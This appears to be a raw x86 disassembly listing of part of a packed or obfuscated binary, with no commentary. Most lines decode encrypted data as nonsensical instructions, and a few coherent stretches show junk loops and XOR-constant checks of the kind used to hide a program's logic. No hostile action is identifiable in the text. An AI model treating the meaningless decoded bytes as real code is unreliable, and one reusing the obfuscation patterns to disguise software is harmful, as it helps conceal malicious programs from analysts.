  40c53b:	and    cl,al
  40c53d:	lea    ebx,[ecx+0x4bf57191]
  40c543:	jne    0x40c4ec
  40c545:	xor    BYTE PTR [edi+0x54],bh
  40c548:	fnstenv [edi-0x4a]
  40c54b:	cdq    
  40c54c:	jo     0x40c4e4
  40c54e:	scas   al,BYTE PTR es:[edi]
  40c54f:	rcr    DWORD PTR [ebx-0x5b4e9814],cl
  40c555:	repnz mov al,ds:0x9329ea45
  40c55b:	out    0x9a,eax
  40c55d:	xor    eax,0x90225de9
  40c562:	xor    eax,0x7510855
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	push   ecx
  40c579:	int    0xa7
  40c57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c57c:	jno    0x40c505
  40c57e:	jo     0x40c5f0
  40c580:	jb     0x40c601
  40c582:	jo     0x40c5f4
  40c584:	test   esi,ecx
  40c586:	mov    cs,ecx
  40c588:	sar    dl,0x6
  40c58b:	mov    edx,0x4cca5c55
  40c590:	cli    
  40c591:	loope  0x40c58e
  40c593:	ret    0x9056
  40c596:	or     BYTE PTR [ebx+ecx*1],0xd
  40c59a:	das    
  40c59b:	push   edx
  40c59c:	xchg   DWORD PTR [eax+0x4f],esi
  40c59f:	and    al,0x88
  40c5a1:	and    eax,0x2fcc6746
  40c5a6:	xchg   ebx,eax
  40c5a7:	dec    ebx
  40c5a8:	sbb    dh,ah
  40c5aa:	fstp   DWORD PTR [ebx+0x1a65bcd8]
  40c5b0:	loop   0x40c5dc
  40c5b2:	(bad)  
  40c5b3:	cmp    BYTE PTR [eax],dl
  40c5b5:	xor    BYTE PTR [ebx],ah
  40c5b7:	fcom   DWORD PTR [edi]
  40c5b9:	out    dx,eax
  40c5ba:	xor    eax,0xe0ccc0b4
  40c5bf:	dec    esi
  40c5c0:	and    BYTE PTR ds:0xfad2567b,bh
  40c5c6:	mov    ds:0x3c647998,al
  40c5cb:	sub    cl,dl
  40c5cd:	push   esp
  40c5ce:	(bad)  
  40c5cf:	jns    0x40c5bf
  40c5d1:	jmp    0x40c599
  40c5d3:	dec    ebp
  40c5d4:	std    
  40c5d5:	outs   dx,DWORD PTR ds:[esi]
  40c5d6:	and    ecx,eax
  40c5d8:	cdq    
  40c5d9:	(bad)  
  40c5da:	leave  
  40c5db:	and    DWORD PTR [esi],ebp
  40c5dd:	xor    edx,esi
  40c5df:	les    esi,FWORD PTR [esi-0x13]
  40c5e2:	mov    ds:0x3397fcaf,al
  40c5e7:	sbb    al,0xf1
  40c5e9:	cmp    BYTE PTR [ecx],dl
  40c5eb:	pop    edi
  40c5ec:	ficomp WORD PTR [ebp+0x5f231484]
  40c5f2:	je     0x40c576
  40c5f4:	stc    
  40c5f5:	int    0x57
  40c5f7:	inc    ecx
  40c5f8:	sub    DWORD PTR [edi-0x6f],ecx
  40c5fb:	(bad)  
  40c5fc:	dec    ebx
  40c5fd:	fidiv  WORD PTR [edx]
  40c5ff:	xlat   BYTE PTR ds:[ebx]
  40c600:	mov    WORD PTR [esi],fs
  40c602:	test   eax,0xfb032965
  40c607:	add    al,0xb1
  40c609:	icebp  
  40c60a:	adc    al,0x4b
  40c60c:	loopne 0x40c60e
  40c60e:	lods   al,BYTE PTR ds:[esi]
  40c60f:	clc    
  40c610:	push   esi
  40c611:	mov    al,ds:0x5f127cae
  40c616:	aam    0x3e
  40c618:	cdq    
  40c619:	push   es
  40c61a:	(bad)  
  40c61b:	xor    ecx,DWORD PTR [edi*1+0x7825f06]
  40c622:	sbb    eax,0xe7515058
  40c627:	es mov edi,0xbf049f37
  40c62d:	loop   0x40c614
  40c62f:	into   
  40c630:	add    al,BYTE PTR [ebp+ebp*4+0x27]
  40c634:	and    al,0x8b
  40c636:	ret    0x8f89
  40c639:	dec    ebp
  40c63a:	xchg   DWORD PTR [edx+0x7c],esi
  40c63d:	stc    
  40c63e:	(bad)  
  40c63f:	bound  edi,QWORD PTR [eax-0x10ed9b68]
  40c645:	jg     0x40c5f3
  40c647:	cmp    eax,0x3d8413e2
  40c64c:	push   ss
  40c64d:	sbb    ch,cl
  40c64f:	lds    esp,FWORD PTR [ecx+0x57]
  40c652:	jmp    0x40c694
  40c654:	loopne 0x40c61b
  40c656:	sahf   
  40c657:	mov    eax,ds:0xac6e76cd
  40c65c:	mov    al,ds:0x76379fb4
  40c661:	aam    0xd5
  40c663:	retf   
  40c664:	jl     0x40c642
  40c666:	test   DWORD PTR [esi+eiz*4+0x17fecada],ecx
  40c66d:	scas   eax,DWORD PTR es:[edi]
  40c66e:	aaa    
  40c66f:	xchg   esp,eax
  40c671:	pop    ecx
  40c672:	daa    
  40c673:	inc    ebp
  40c674:	gs daa 
  40c676:	add    DWORD PTR [eax],ebp
  40c678:	cld    
  40c679:	adc    esp,esi
  40c67b:	jmp    0xedffeebc
  40c680:	mov    dl,0x16
  40c682:	push   0x61
  40c684:	adc    dh,BYTE PTR [esi]
  40c686:	(bad)  
  40c687:	jmp    0xc4b6c5aa
  40c68c:	dec    edx
  40c68d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c68e:	scas   eax,DWORD PTR es:[edi]
  40c68f:	call   0x43fc:0xfa698f0b
  40c696:	outs   dx,DWORD PTR ds:[esi]
  40c697:	or     ah,BYTE PTR [edx]
  40c699:	adc    edi,DWORD PTR [ecx+0x6f]
  40c69c:	or     eax,0xb205a717
  40c6a1:	stos   BYTE PTR es:[edi],al
  40c6a2:	jp     0x40c6f6
  40c6a4:	cmp    eax,0x4a406f14
  40c6a9:	(bad)  
  40c6aa:	mov    esi,cs
  40c6ac:	pusha  
  40c6ad:	sbb    DWORD PTR [edx+0x3236c29a],edx
  40c6b3:	in     al,0xfc
  40c6b5:	sahf   
  40c6b6:	(bad)  
  40c6b7:	int3   
  40c6b8:	xchg   ebx,eax
  40c6b9:	sub    BYTE PTR [edx-0x1],ah
  40c6bc:	mov    DWORD PTR [ebx+0x75d4038e],edi
  40c6c2:	pop    eax
  40c6c3:	pop    es
  40c6c4:	mov    DWORD PTR ds:0xa163b461,esi
  40c6ca:	dec    ecx
  40c6cb:	xor    al,0xa2
  40c6cd:	test   al,0x17
  40c6cf:	push   ds
  40c6d0:	ret    
  40c6d1:	xchg   esi,eax
  40c6d2:	rcl    BYTE PTR [ecx+0x57735d0a],cl
  40c6d8:	sbb    DWORD PTR [eax],ebx
  40c6da:	mov    dh,0x9d
  40c6dc:	std    
  40c6dd:	sti    
  40c6de:	mov    al,0x6
  40c6e0:	test   BYTE PTR [ebx-0x4584f6f4],0xf1
  40c6e7:	sar    dl,0xf3
  40c6ea:	shl    bh,1
  40c6ec:	dec    ecx
  40c6ed:	out    dx,al
  40c6ee:	add    eax,0x95a34f60
  40c6f3:	(bad)  
  40c6f4:	adc    esi,DWORD PTR [eax+0x59ab1c81]
  40c6fa:	ins    DWORD PTR es:[edi],dx
  40c6fb:	das    
  40c6fc:	and    ah,ch
  40c6fe:	push   ds
  40c6ff:	dec    esi
  40c700:	inc    ecx
  40c701:	dec    ebx
  40c702:	dec    ebp
  40c703:	inc    edi
  40c704:	add    DWORD PTR [eax-0x4],edx
  40c707:	and    edi,0xfffffff9
  40c70a:	ret    0x22e9
  40c70d:	push   ds
  40c70e:	mov    al,ds:0xed9c5337
  40c713:	xadd   al,bh
  40c716:	mov    eax,ds:0xb6509ca5
  40c71b:	pop    esi
  40c71c:	xor    dl,BYTE PTR [ebx-0x7b0c84e7]
  40c722:	xor    ah,bl
  40c724:	leave  
  40c725:	std    
  40c726:	jns    0x40c70d
  40c728:	jp     0x40c6c9
  40c72a:	mov    ah,0x4
  40c72c:	or     al,0xc1
  40c72e:	and    dl,BYTE PTR [eax]
  40c730:	test   DWORD PTR [edi],edi
  40c732:	mov    cl,0x1a
  40c734:	test   DWORD PTR [ecx+0x20c6232c],edi
  40c73a:	mov    BYTE PTR [edx-0x2f8321a0],bl
  40c740:	in     al,0xa
  40c742:	and    BYTE PTR [ebx-0x19],dl
  40c745:	sub    ebp,DWORD PTR [edx+0x29]
  40c748:	xchg   ebx,eax
  40c749:	sbb    ebx,DWORD PTR [eax]
  40c74b:	imul   ebx,DWORD PTR [edi],0xffffffce
  40c74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c74f:	add    al,0x94
  40c751:	into   
  40c752:	xchg   ecx,eax
  40c753:	mov    eax,ds:0xc7ae525a
  40c758:	and    ebp,DWORD PTR [esi]
  40c75a:	jmp    0x4765aa20
  40c75f:	popa   
  40c760:	add    ah,al
  40c762:	ss xchg edi,eax
  40c764:	fisubr DWORD PTR [esi-0xa]
  40c767:	repnz out 0xfa,eax
  40c76a:	iret   
  40c76b:	pop    eax
  40c76c:	fadd   QWORD PTR [eax+0x6b]
  40c76f:	add    al,0x9
  40c771:	dec    esp
  40c772:	loopne 0x40c726
  40c774:	fucomi st,st(6)
  40c776:	stc    
  40c777:	lahf   
  40c778:	imul   dh
  40c77a:	jb     0x40c732
  40c77c:	out    dx,al
  40c77d:	sub    al,0xb7
  40c77f:	(bad)  
  40c780:	mov    dl,0x60
  40c782:	add    eax,0x32729c
  40c787:	leave  
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x4343f2,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432780,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432780
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432780,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432780,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432780,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432e42
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d9e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434406,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434406
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434406,ecx
  40c805:	cmp    DWORD PTR ds:0x434406,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434406,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43449d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x432a6a
  40c82d:	cmp    DWORD PTR ds:0x434406,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434406
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434406,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x434422,0x1c
  40c856:	cmp    DWORD PTR ds:0x434422,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x434422,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432ce6
  40c87c:	cmp    DWORD PTR ds:0x434422,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x434422
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x434422,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x434422
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x434422,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	ror    eax,0x83
  40c8dc:	sub    eax,DWORD PTR [esi+0x73]
  40c8df:	test   DWORD PTR [eax+0x70],esi
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c86d
  40c8e7:	(bad)  
  40c8e8:	mov    ch,0x38
  40c8ea:	js     0x40c8af
  40c8ec:	mov    al,ds:0xe2752a12
  40c8f1:	add    al,0x3f
  40c8f3:	adc    edi,ebx
  40c8f5:	aas    
  40c8f6:	cmp    dh,BYTE PTR [edi-0x7c]
  40c8f9:	mov    ebp,DWORD PTR [edi+0x5168ac8]
  40c8ff:	cmp    BYTE PTR [eax],bl
  40c901:	cli    
  40c902:	out    dx,al
  40c903:	mov    eax,0xc362e5cb
  40c908:	ja     0x40c989
  40c90a:	jnp    0x40c989
  40c90c:	xchg   ebx,eax
  40c90d:	mov    BYTE PTR [eax-0x2a],0x25
  40c911:	sbb    dh,BYTE PTR [ebp+eiz*8+0x6eb510a9]
  40c918:	mov    BYTE PTR [ebp-0x38],cl
  40c91b:	mov    WORD PTR [esi-0x20a03735],?
  40c921:	cmc    
  40c922:	into   
  40c923:	stos   DWORD PTR es:[edi],eax
  40c924:	(bad)  
  40c925:	jmp    0xf67d:0x8ec12151
  40c92c:	pop    edi
  40c92d:	add    esp,DWORD PTR [ebx]
  40c92f:	jmp    FWORD PTR [ecx-0x4bf63e8c]
  40c935:	leave  
  40c936:	into   
  40c937:	mul    BYTE PTR [ebx+0x3c]
  40c93a:	in     al,0xdf
  40c93c:	mov    ah,0xd
  40c93e:	inc    esp
  40c93f:	push   esi
  40c940:	xchg   edx,eax
  40c941:	dec    edi
  40c942:	add    ch,BYTE PTR [eax]
  40c944:	mov    ch,0x5b
  40c946:	paddb  mm3,QWORD PTR [ebp+0x68]
  40c94a:	test   al,0xb4
  40c94c:	mov    ecx,0x92ec2276
  40c951:	fiadd  WORD PTR [ebx-0x5738da1f]
  40c957:	outs   dx,DWORD PTR ds:[esi]
  40c958:	mov    edx,0xa0daf613
  40c95d:	add    al,0x33
  40c95f:	(bad)  
  40c960:	fwait
  40c961:	sar    DWORD PTR [eax],0x45
  40c964:	cli    
  40c965:	mov    gs,WORD PTR [ebp+eax*1-0x5ac0d49a]
  40c96c:	jl     0x40c986
  40c96e:	cmp    edx,DWORD PTR [eax+0x74]
  40c971:	or     eax,0x77f90189
  40c976:	dec    ebp
  40c977:	cld    
  40c978:	scas   eax,DWORD PTR es:[edi]
  40c979:	popf   
  40c97a:	sti    
  40c97b:	lock push edi
  40c97e:	retf   
  40c97f:	stc    
  40c980:	push   DWORD PTR ds:0x7613461
  40c986:	cli    
  40c987:	cdq    
  40c988:	rcr    DWORD PTR [ebx+0x1522a1d5],0x63
  40c98f:	pop    edx
  40c990:	fcomip st,st(7)
  40c992:	jge    0x40c959
  40c994:	test   BYTE PTR [ebx+0x4badd86e],dl
  40c99a:	ds dec esi
  40c99c:	dec    esp
  40c99d:	sbb    eax,0x2ce2a5fe
  40c9a2:	repnz mov dl,0x1e
  40c9a5:	lock loope 0x40c96b
  40c9a8:	rcr    eax,0x6
  40c9ab:	mov    ah,BYTE PTR [ebp-0x21]
  40c9ae:	or     dl,cl
  40c9b0:	mov    eax,ds:0x7b8b11e4
  40c9b5:	add    esi,ebx
  40c9b7:	sbb    al,0x74
  40c9b9:	icebp  
  40c9ba:	out    dx,al
  40c9bb:	mov    esp,0xcf87e779
  40c9c0:	adc    eax,0x17f3cd13
  40c9c5:	aas    
  40c9c6:	mov    esp,0xd38fac16
  40c9cb:	cmp    bl,BYTE PTR [eax+0x63a0b3e]
  40c9d1:	jl     0x40c983
  40c9d3:	cwde   
  40c9d4:	sbb    bh,cl
  40c9d6:	sub    dh,BYTE PTR [ebp+0x570f78b1]
  40c9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9dd:	cmp    ebx,edi
  40c9df:	pop    ds
  40c9e0:	jmp    0xf94d007b
  40c9e5:	in     al,dx
  40c9e6:	aad    0x91
  40c9e8:	or     eax,0x50dfc580
  40c9ed:	add    DWORD PTR [ebx+edi*1],edx
  40c9f0:	fst    DWORD PTR [ebp+0x35]
  40c9f3:	xlat   BYTE PTR ds:[ebx]
  40c9f4:	pop    eax
  40c9f5:	and    BYTE PTR [ebx-0x79d9c98f],dh
  40c9fb:	pusha  
  40c9fc:	push   ecx
  40c9fd:	(bad)  
  40c9fe:	int    0xe9
  40ca00:	or     bh,cl
  40ca02:	int    0x1c
  40ca04:	push   edx
  40ca05:	pop    esi
  40ca06:	push   ebp
  40ca07:	jge    0x40ca75
  40ca09:	es cmc 
  40ca0b:	mov    BYTE PTR [edx+0x5353160],dh
  40ca11:	fsub   DWORD PTR [eax+0x31]
  40ca14:	ret    
  40ca15:	call   0x179d9a9b
  40ca1a:	sar    ah,1
  40ca1c:	or     DWORD PTR [edx-0x6386294b],ebx
  40ca22:	jmp    0x2204805a
  40ca27:	popf   
  40ca28:	cs aas 
  40ca2a:	test   BYTE PTR [ebp+0x73bec3e0],ch
  40ca30:	sbb    ah,BYTE PTR [ebx]
  40ca32:	dec    ecx
  40ca33:	neg    BYTE PTR [edi-0x77f33eeb]
  40ca39:	stos   DWORD PTR es:[edi],eax
  40ca3a:	cs call 0xd814:0x1c2b9924
  40ca42:	cwde   
  40ca43:	jnp    0x40c9e8
  40ca45:	push   ecx
  40ca46:	push   es
  40ca47:	dec    eax
  40ca48:	mov    dh,0xfb
  40ca4a:	and    eax,DWORD PTR [esi]
  40ca4c:	sub    al,0x30
  40ca4e:	push   eax
  40ca4f:	fcom   DWORD PTR ds:0x796164c4
  40ca55:	pop    ecx
  40ca56:	jae    0x40ca16
  40ca58:	imul   edx,DWORD PTR [ecx],0x3f14d140
  40ca5e:	sub    ebp,DWORD PTR [edx+0x18663136]
  40ca64:	lods   al,BYTE PTR ds:[esi]
  40ca65:	dec    ecx
  40ca66:	pop    eax
  40ca67:	loopne 0x40ca04
  40ca69:	test   BYTE PTR [edx-0x71],0x7d
  40ca6d:	jl     0x40ca9f
  40ca6f:	mov    edx,DWORD PTR [ecx+0x5b]
  40ca72:	jo     0x40ca05
  40ca74:	jp     0x40caac
  40ca76:	sbb    al,0x3
  40ca78:	mov    fs,WORD PTR [esi]
  40ca7a:	jo     0x40ca8f
  40ca7c:	inc    ebx
  40ca7d:	xor    DWORD PTR [edi+0x3ab277ae],ecx
  40ca83:	pop    ebp
  40ca84:	shl    BYTE PTR [ecx],0x8c
  40ca87:	xchg   edx,eax
  40ca88:	xchg   BYTE PTR [eax+ebx*2+0x5e72b904],cl
  40ca8f:	sbb    eax,0x70643ec2
  40ca94:	fldcw  WORD PTR [eax-0x41]
  40ca97:	repnz sub eax,0x345777de
  40ca9d:	xor    BYTE PTR [ecx-0x18],cl
  40caa0:	xor    dh,BYTE PTR [ebx+0x2b]
  40caa3:	xchg   edi,eax
  40caa4:	dec    eax
  40caa5:	nop
  40caa6:	mov    bh,0x8b
  40caa8:	inc    esi
  40caa9:	in     eax,dx
  40caaa:	xor    ecx,ebp
  40caac:	jle    0x40cab1
  40caae:	retf   0xa044
  40cab1:	push   eax
  40cab2:	stos   BYTE PTR es:[edi],al
  40cab3:	sub    al,0xea
  40cab5:	adc    BYTE PTR [esp+ebp*4-0x7f9035a5],ah
  40cabc:	jns    0x40ca41
  40cabe:	xchg   BYTE PTR [ebp-0x3a],al
  40cac1:	mov    gs,eax
  40cac3:	in     eax,0xd0
  40cac5:	ins    DWORD PTR es:[edi],dx
  40cac6:	push   ss
  40cac7:	pop    ecx
  40cac8:	fld    DWORD PTR [ebx+0x19]
  40cacb:	dec    ebp
  40cacc:	mov    al,gs:0x53d185d0
  40cad2:	sub    dh,bh
  40cad4:	popa   
  40cad5:	jle    0x40ca7b
  40cad7:	sar    BYTE PTR [edx-0x18],cl
  40cada:	jecxz  0x40ca5c
  40cadc:	mov    bl,0xa5
  40cade:	call   0x4cb7:0x5a29b856
  40cae5:	add    bh,BYTE PTR [edi]
  40cae7:	mov    cl,0x30
  40cae9:	je     0x40caf6
  40caeb:	or     eax,0xf17852ad
  40caf0:	ds in  al,0xa4
  40caf3:	sar    DWORD PTR [eax+ecx*4-0x5358d00c],1
  40cafa:	mov    cl,0xd4
  40cafc:	ins    BYTE PTR es:[edi],dx
  40cafd:	adc    BYTE PTR [esi-0x381b9e92],dl
  40cb03:	rcr    ebx,0xff
  40cb06:	test   ebp,edx
  40cb08:	add    al,0x56
  40cb0a:	jecxz  0x40cb42
  40cb0c:	lods   al,BYTE PTR ds:[esi]
  40cb0d:	xchg   ecx,eax
  40cb0e:	xchg   esp,eax
  40cb0f:	push   es
  40cb10:	jne    0x40cb42
  40cb12:	fsubrp st(1),st
  40cb14:	aaa    
  40cb15:	mov    al,ds:0x344d21b5
  40cb1a:	pop    ds
  40cb1b:	je     0x40cb28
  40cb1d:	mov    al,ds:0x6c46b234
  40cb22:	pop    ebp
  40cb23:	test   BYTE PTR [edx+0x7a],0x61
  40cb27:	fnstenv [esi]
  40cb29:	adc    dh,BYTE PTR [edi+eax*2-0x40]
  40cb2d:	or     bh,BYTE PTR [ebp+0x672ff3b6]
  40cb33:	jge    0x40cb3e
  40cb35:	sub    BYTE PTR [ebp*8-0x58f4ebc9],bh
  40cb3c:	xor    BYTE PTR [ebx],bh
  40cb3e:	(bad)  
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	mov    cs:0x82cc0d6e,al
  40cb71:	jo     0x40cbe3
  40cb73:	leave  
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb29
  40cb78:	fbstp  TBYTE PTR [ebp-0xde6816e]
  40cb7e:	inc    esp
  40cb7f:	cdq    
  40cb80:	mov    BYTE PTR [ebp-0x24],al
  40cb83:	mov    ebp,0x29961963
  40cb88:	mov    ah,0xeb
  40cb8a:	and    bh,BYTE PTR [esi-0x1caae507]
  40cb90:	leave  
  40cb91:	fldcw  WORD PTR [edx-0x15bafb8b]
  40cb97:	sar    BYTE PTR [ebx-0x47],0xed
  40cb9b:	pop    ds
  40cb9c:	mov    esp,0x2e03a03d
  40cba1:	push   esi
  40cba2:	mov    ebx,0x99ebcebd
  40cba7:	dec    ebx
  40cba8:	(bad)  
  40cba9:	scas   eax,DWORD PTR es:[edi]
  40cbaa:	adc    al,0x7a
  40cbac:	icebp  
  40cbad:	iret   
  40cbae:	dec    ebx
  40cbaf:	or     DWORD PTR [ecx+0x1d],ecx
  40cbb2:	jns    0x40cb93
  40cbb4:	jbe    0x40cb74
  40cbb6:	loop   0x40cb8d
  40cbb8:	int3   
  40cbb9:	mov    BYTE PTR [esi+0x57],dh
  40cbbc:	xchg   esp,eax
  40cbbd:	iret   
  40cbbe:	push   eax
  40cbbf:	loop   0x40cb7c
  40cbc1:	jl     0x40cbd5
  40cbc3:	sbb    al,bh
  40cbc5:	aas    
  40cbc6:	jno    0x40cc1d
  40cbc8:	mov    ?,WORD PTR [edi+0x51]
  40cbcb:	stc    
  40cbcc:	mov    eax,0xcc596faf
  40cbd1:	lea    ecx,ds:0x7c006242
  40cbd7:	jl     0x40cc57
  40cbd9:	jl     0x40cc01
  40cbdb:	jns    0x40cb86
  40cbdd:	imul   ebp,DWORD PTR [ebp-0x6c7fe8dc],0xffffffb0
  40cbe4:	imul   esi,DWORD PTR [ecx],0xa9e59445
  40cbea:	ret    
  40cbeb:	jge    0x40cc4b
  40cbed:	and    ch,BYTE PTR [ebx]
  40cbef:	add    esp,DWORD PTR [ebp+0x774e2b36]
  40cbf5:	mov    esp,0xd7007b63
  40cbfa:	pop    esp
  40cbfb:	mov    bh,0x9e
  40cbfd:	cdq    
  40cbfe:	sbb    eax,0x53e64f87
  40cc03:	jmp    0x40cc1b
  40cc05:	adc    eax,0x744ad12d
  40cc0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc0b:	pop    ss
  40cc0c:	xor    esi,eax
  40cc0e:	mov    ds:0x52dee791,eax
  40cc13:	sbb    al,BYTE PTR [eax+ecx*2+0x53ebc5b0]
  40cc1a:	cmp    al,0xb
  40cc1c:	int3   
  40cc1d:	dec    esi
  40cc1e:	jmp    0xde524e3b
  40cc23:	cmp    cl,BYTE PTR [edx-0x74d41d3d]
  40cc29:	(bad)  
  40cc2a:	call   FWORD PTR [edx+0x54a5798e]
  40cc30:	iret   
  40cc31:	dec    edi
  40cc32:	mov    ds:0x7eb4aa08,eax
  40cc37:	out    0xc,eax
  40cc39:	es in  eax,0x6c
  40cc3c:	pop    ebp
  40cc3d:	rol    DWORD PTR [edx],cl
  40cc3f:	xor    DWORD PTR [ebp-0x5f5d2540],edx
  40cc45:	stos   DWORD PTR es:[edi],eax
  40cc46:	xor    eax,DWORD PTR [ecx+0x693e4e79]
  40cc4c:	or     edi,edx
  40cc4e:	imul   edx,ebx,0x4277a6b7
  40cc54:	ss cli 
  40cc56:	push   cs
  40cc57:	sub    ch,BYTE PTR [ecx]
  40cc59:	ds mov edx,0xa50be26c
  40cc5f:	ins    BYTE PTR es:[edi],dx
  40cc60:	dec    esp
  40cc61:	out    0x2f,eax
  40cc63:	sbb    bh,ah
  40cc65:	mov    eax,ds:0xda24ff6f
  40cc6a:	hlt    
  40cc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc6c:	cmp    ah,BYTE PTR [esp+ebx*8+0x40]
  40cc70:	mov    dl,0xc1
  40cc72:	xchg   esp,eax
  40cc73:	(bad)  
  40cc74:	jg     0x40ccd0
  40cc76:	mov    BYTE PTR [ecx],al
  40cc78:	or     al,BYTE PTR ds:0xcce51043
  40cc7e:	mov    esp,0x2ffa440a
  40cc83:	or     al,0xe1
  40cc85:	sub    edx,ecx
  40cc87:	fbld   TBYTE PTR [eax-0x55]
  40cc8a:	ret    
  40cc8b:	or     BYTE PTR [ebx+eiz*1+0x6],ch
  40cc8f:	js     0x40cc90
  40cc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc92:	adc    al,0x66
  40cc94:	xchg   ecx,eax
  40cc95:	adc    eax,0xf05b9f4c
  40cc9a:	or     bh,BYTE PTR [ecx+esi*4+0x37]
  40cc9e:	mov    cl,0x98
  40cca0:	fmul   DWORD PTR [esp+esi*2]
  40cca3:	sub    eax,0x3ddf8683
  40cca8:	out    dx,al
  40cca9:	cmp    eax,0x6153ef58
  40ccae:	inc    ecx
  40ccaf:	int3   
  40ccb0:	or     BYTE PTR [eax+0x9],dl
  40ccb3:	test   edi,0x6719324b
  40ccb9:	dec    esp
  40ccba:	retf   
  40ccbb:	jb     0x40ccf5
  40ccbd:	inc    edi
  40ccbe:	pop    edi
  40ccbf:	cmp    ecx,DWORD PTR [eax+0x36]
  40ccc2:	jno    0x40cc58
  40ccc4:	mov    edx,0xa8b70726
  40ccc9:	test   BYTE PTR [ebx],bl
  40cccb:	cmp    bh,BYTE PTR [eax+ecx*2-0x444b9dd3]
  40ccd2:	nop
  40ccd3:	lea    edi,[esi+0x46]
  40ccd6:	(bad)  
  40ccd7:	push   0xf0d3b004
  40ccdc:	xchg   DWORD PTR [ecx-0x45179e86],esp
  40cce2:	or     eax,0x68db819e
  40cce7:	jg     0x40cd48
  40cce9:	push   ebp
  40ccea:	push   es
  40cceb:	push   ss
  40ccec:	shl    esp,0x48
  40ccef:	inc    esp
  40ccf0:	pusha  
  40ccf1:	sub    eax,0xeed40440
  40ccf6:	clc    
  40ccf7:	cwde   
  40ccf8:	(bad)  
  40ccf9:	cld    
  40ccfa:	xor    BYTE PTR [eax],dh
  40ccfc:	stos   DWORD PTR es:[di],eax
  40ccfe:	js     0x40cd17
  40cd00:	(bad)  
  40cd01:	or     ah,BYTE PTR [edx]
  40cd03:	call   0x6ffc3718
  40cd08:	sub    DWORD PTR [ebp-0x40],ebx
  40cd0b:	dec    esi
  40cd0c:	push   edx
  40cd0d:	lea    ebx,[ebx+0x5a]
  40cd10:	ficomp DWORD PTR [esi-0x9]
  40cd13:	mov    bh,0xdb
  40cd15:	push   0xd74b9328
  40cd1a:	push   esp
  40cd1b:	pop    esp
  40cd1c:	mov    ebx,0x8ecc29cf
  40cd21:	aad    0x3e
  40cd23:	add    al,0x2b
  40cd25:	(bad)  
  40cd26:	xor    cl,BYTE PTR [edx-0x42]
  40cd29:	stos   BYTE PTR es:[edi],al
  40cd2a:	cli    
  40cd2b:	inc    edx
  40cd2c:	jmp    DWORD PTR [eax-0x67855cfc]
  40cd32:	pushf  
  40cd33:	jns    0x40cd22
  40cd35:	outs   dx,DWORD PTR ds:[esi]
  40cd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd37:	add    BYTE PTR [edi],dl
  40cd39:	mov    ah,0xe6
